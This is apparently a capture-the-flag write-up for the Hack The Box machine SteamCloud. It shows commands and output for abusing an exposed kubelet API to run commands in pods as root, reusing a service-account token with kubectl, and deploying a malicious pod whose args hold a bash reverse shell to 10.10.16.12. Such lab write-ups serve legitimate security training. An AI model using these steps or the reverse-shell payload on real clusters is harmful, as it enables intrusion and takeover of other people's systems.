### writeup
https://0xdf.gitlab.io/2022/02/14/htb-steamcloud.html#kubelet-api---tcp-10250

### Enum
##### The kubelet agent listens on tcp 10250
```bash
❯ kubeletctl pods -s $IP
┌─────────────────────────────────────────────────────────────────────────────────┐
│                                Pods from Kubelet                                │
├────┬────────────────────────────────────┬─────────────┬─────────────────────────┤
│    │ POD                                │ NAMESPACE   │ CONTAINERS              │
├────┼────────────────────────────────────┼─────────────┼─────────────────────────┤
├────┼────────────────────────────────────┼─────────────┼─────────────────────────┤
│  9 │ nginx                              │ default     │ nginx                   │
│    │                                    │             │                         │
├────┼────────────────────────────────────┼─────────────┼─────────────────────────┤

❯ kubeletctl runningpods -s $IP | jq -c '.items[].metadata | [.name, .namespace]'
["baturu11","default"]
["storage-provisioner","kube-system"]
["kube-scheduler-steamcloud","kube-system"]
["kube-controller-manager-steamcloud","kube-system"]
["nginx","default"]
```

### Shell
```bash
❯ kubeletctl -s $IP exec "/bin/bash" -p nginx -c nginx
root@nginx:/# id
id
uid=0(root) gid=0(root) groups=0(root)
```

### Token and Cert
HackTricks shows the location of the ServiceAccount object, which is managed by Kubernets and provides identity within the pod. It gives three typical directories:
 
* `/run/secrets/kubernetes.io/serviceaccount`
* `/var/run/secrets/kubernetes.io/serviceaccount`
* `/secrets/kubernetes.io/serviceaccout`

### get pods
```bash
kubectl get pods --all-namespaces --token $(cat token) --server https://$IP:8443 --certificate-authority ca.crt
```

Not working due to
```txt
    -A, --all-namespaces=false:
        If present, list the requested object(s) across all namespaces. Namespace in current context is ignored even
        if specified with --namespace.
        ```

```bash
❯ kubectl get pods --token $(cat token) --server https://$IP:8443 --certificate-authority ca.crt
NAME    READY   STATUS    RESTARTS   AGE
nginx   1/1     Running   0          113m
```

`get pod` returns information about the running pod!

### get namespaces
```bash
kubectl get namespaces --token $(cat token) --server https://$IP:8443 --certificate-authority ca.crt

Error from server (Forbidden): namespaces is forbidden: User "system:serviceaccount:default:default" cannot list resource "namespaces" in API group "" at the cluster scope
```

failed, so get the details of the current context(nginx container) via `-o`

```bash
kubectl get pod nginx -o yaml --token $(cat token) --server https://$IP:8443 --certificate-authority ca.crt > nginx.yaml
```

### can-i
```bash
❯ kubectl auth can-i --list --token $(cat token) --server https://$IP:8443 --certificate-authority ca.crt
Resources                                       Non-Resource URLs                     Resource Names   Verbs
selfsubjectaccessreviews.authorization.k8s.io   []                                    []               [create]
selfsubjectrulesreviews.authorization.k8s.io    []                                    []               [create]
pods                                            []                                    []               [get create list]
                                                [/.well-known/openid-configuration]   []               [get]
```

### Root
* https://github.com/A1vinSmith/Cloud-Hacking/tree/main/HackTheBox/Unobtainium#malicious-pod-with-two-alternative-yamls

###### Shell via launch Pod `get pod`
```bash
kubectl apply -f root2.yaml --token $(cat token) --server https://$IP:8443 --certificate-authority ca.crt

kubectl --token $(cat token) --server https://$IP:8443 --certificate-authority ca.crt get pod baturu18 -n default
```
For some reason I can't make it work. I figured it out eventually, lol.

```yaml
    command: ["/bin/sh"]
    args: ["-c", "/bin/bash -i >& /dev/tcp/10.10.16.12/80 0>&1"]
    ```
    When I'm copying from Unobtainium, the command left as `/bin/sh` but my payload was `/bin/bash`. It worked well after I make them the same.

##### Exec Por `exex`
```bash
baturu01 created
❯ kubectl get pods --token $(cat token) --server https://$IP:8443 --certificate-authority ca.crt
NAME       READY   STATUS             RESTARTS        AGE
baturu01   1/1     Running            0               8s
baturu11   0/1     CrashLoopBackOff   8 (3m31s ago)   19m
baturu12   0/1     CrashLoopBackOff   8 (64s ago)     17m
baturu13   0/1     CrashLoopBackOff   7 (4m25s ago)   15m
baturu14   0/1     CrashLoopBackOff   7 (2m29s ago)   13m
baturu15   0/1     CrashLoopBackOff   6 (5m12s ago)   10m
baturu16   0/1     CrashLoopBackOff   5 (2m15s ago)   5m16s
baturu17   0/1     CrashLoopBackOff   5 (26s ago)     3m32s
nginx      1/1     Running            0               3h21m
❯ kubectl  --token $(cat token) --server https://$IP:8443 --certificate-authority ca.crt
❯ kubeletctl -s $IP exec "/bin/bash" -p baturu01 -c baturu01
root@steamcloud:/# id
uid=0(root) gid=0(root) groups=0(root)
```